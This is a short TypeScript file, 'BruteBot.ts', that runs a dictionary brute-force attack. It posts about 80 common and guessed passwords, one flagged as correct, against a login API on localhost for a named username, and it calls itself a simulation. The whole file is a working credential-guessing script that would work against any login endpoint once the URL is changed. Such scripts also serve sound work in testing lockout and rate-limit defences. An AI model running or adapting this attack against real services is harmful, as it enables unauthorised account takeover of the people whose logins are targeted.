// BruteBot.ts
const CompromisedUsername = "Mohsen90";

const PasswordDictionary = [
  "123456",
  "password",
  "123456789",
  "12345",
  "qwerty",
  "abc123",
  "football",
  "monkey",
  "letmein",
  "dragon",
  "111111",
  "baseball",
  "iloveyou",
  "master",
  "sunshine",
  "ashley",
  "bailey",
  "welcome",
  "shadow",
  "princess",
  "qwerty123",
  "admin",
  "login",
  "passw0rd",
  "1234567",
  "1234",
  "1q2w3e4r",
  "password1",
  "zaq12wsx",
  "qazwsx",
  "trustno1",
  "superman",
  "pokemon",
  "mohsen123",
  "mohsen90",
  "mohsen2024",
  "letmein123",
  "darklord99",
  "ruinshade",
  "hexshade01",
  "shade#9",
  "shade999",
  "demon#7",
  "dark#shadow",
  "shadowlord",
  "123123",
  "coolguy90",
  "mypass123",
  "nothing1",
  "helloworld",
  "genericpass",
  "mysecurepass",
  "notsecure",
  "guessme",
  "iamhidden",
  "cantguessme",
  "strongpass",
  "weaktoday",
  "123qwe",
  "1qaz2wsx",
  "pass1234",
  "pass4321",
  "simplepass",
  "tempPass1",
  "temp12345",
  "testing123",
  "tester90",
  "darkshade",
  "hexruin#shade",
  "ruin#hex9",
  "hexkey999",
  "pass#shade",
  "bluefire9",
  "stormpass1",
  "silverblade",
  "goldpass22",
  "rootaccess",
  "toor",
  "letmeinnow",
  "HexRuin#9Shade", // Correct password
];

async function bruteForceLogin() {
  console.log("Starting Brute Force Bot Simulation...");

  for (let i = 0; i < PasswordDictionary.length; i++) {
    const attempt = PasswordDictionary[i];

    console.log(`Attempt ${i + 1}: Trying "${attempt}"...`);

    try {
      const response = await fetch("http://localhost:5000/api/Login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: CompromisedUsername,
          password: attempt,
        }),
      });

      const data = await response.json();

      if (response.ok) {
        console.log(`✅ SUCCESS! Password cracked: "${attempt}"`);
        return;
      } else {
        console.log(`❌ Failed: ${data.message}`);
      }
    } catch (err) {
      console.log("Server Error:", err);
      return;
    }
  }

  console.log("Brute Force Finished. No match found.");
}

bruteForceLogin();
